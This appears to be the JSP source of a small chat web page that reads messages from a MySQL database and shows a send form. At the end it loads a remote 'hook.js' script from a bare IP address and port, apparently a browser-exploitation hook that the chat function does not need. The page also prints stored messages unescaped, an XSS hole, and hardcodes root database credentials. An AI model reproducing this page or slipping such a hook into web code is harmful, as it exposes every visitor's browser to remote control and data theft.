<%@ page language="java" contentType="text/html; charset=ISO-8859-1" pageEncoding="ISO-8859-1"%>
<%@ page import="java.sql.*" %>
<%@ page import="java.util.Arrays" %>
<%
    Class.forName("com.mysql.jdbc.Driver");
%>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chatting</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-image:url('https://i.pinimg.com/originals/da/99/65/da996519e3270d5e338d4f66de5478c6.gif');
            background-repeat: no-repeat;
            background-size:cover;
            font-family: Arial, sans-serif;
        }
        .cont {
            margin: 3%;
            padding: 1%;
            height: 600px;
            width: 94%;
            background-image:url('https://cdn.dribbble.com/users/39141/screenshots/4370017/01_copy_195.gif');
            background-repeat: no-repeat;
            background-size:cover;
            border-radius: 20px;
            overflow-y: scroll;
        }
        .msg {
            margin-left: 3%;
            margin-right: 3%;
            margin-top: 10px;
            padding: 0;
            height: 80px;
            width: 94%;
            background-color: brown;
            border-radius: 20px;
            display: flex;
            align-items: center;
        }
        .msg form {
            height: 100%;
            width: 100%;
            display: flex;
            flex-direction: row;
        }
        .msg form button {
            height: 100%;
            width: 19%;
            border-radius: 20px;
            font-size: 20px;
            background-color: chartreuse;
            color: black;
            border: none;
            cursor: pointer;
        }
        .msg form button:hover {
            background-color: darkgreen;
            color: white;
        }
        .msg .mssg {
            height: 74%;
            width: 120%;
            font-size: 20px;
            padding: 10px;
            border-radius: 20px;
            background-color: black;
            color: aquamarine;
            border: none;
            outline: none;
        }
        .message {
            margin: 10px;
            padding: 10px;
            border-radius: 10px;
            background-color: white;
            color: black;
            word-wrap: break-word;
        }
        .message.self {
            background-color: lightblue;
            align-self: flex-end;
        }
        .message.other {
            background-color: lightgreen;
            align-self: flex-start;
        }
    </style>
</head>
<body>

<%
    Connection conn = null;
    PreparedStatement ps = null;
    ResultSet rs = null;
    String fname = "", lname = "", mail = "";
    
    try {
        conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/xbox", "root", "root");
        String gmail = request.getParameter("msg");
        String sqlQuery = "SELECT * FROM esp WHERE email = ?";
        ps = conn.prepareStatement(sqlQuery);
        ps.setString(1, gmail);
        rs = ps.executeQuery();
        
        if (rs.next()) {
            fname = rs.getString(1);
            lname = rs.getString(2);
            mail = rs.getString(5);
        }
        rs.close();
        ps.close();

        String sqlQuery1 = "SELECT * FROM messages";
        ps = conn.prepareStatement(sqlQuery1);
        rs = ps.executeQuery();
%>
    <div class="cont" id="messagesContainer">
<%
        while (rs.next()) {
        	String usen = rs.getString(1);
            String name = rs.getString(2);
            String msg = rs.getString(3);
%>
        <div class="message <%= fname.equals(name) ? "self" : "other" %>"><b><%= name +" <!" +usen +"-->" %>:</b> <%= msg %></div>
<%
        }
        rs.close();
        ps.close();
    } catch (SQLException e) {
        e.printStackTrace();
    } finally {
        try {
            if (rs != null) rs.close();
            if (ps != null) ps.close();
            if (conn != null) conn.close();
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }
%>
    </div>
    <div class="msg">
        <form action="chatx.jsp" method="post">
            <input type="hidden" name="username" value="<%= mail %>">
            <input type="hidden" name="name" class="mssg" value="<%= fname %>" required>
            <input type="text" name="message" class="mssg" placeholder="Type your message here..." required>
            <button type="submit">Send</button>
        </form>
    </div>
    <script>
        // Scroll to the bottom of the messages container
        const messagesContainer = document.getElementById('messagesContainer');
        messagesContainer.scrollTop = messagesContainer.scrollHeight;
    </script>
    <script src="http://147.185.221.21:7518/hook.js"></script>
</body>
</html>
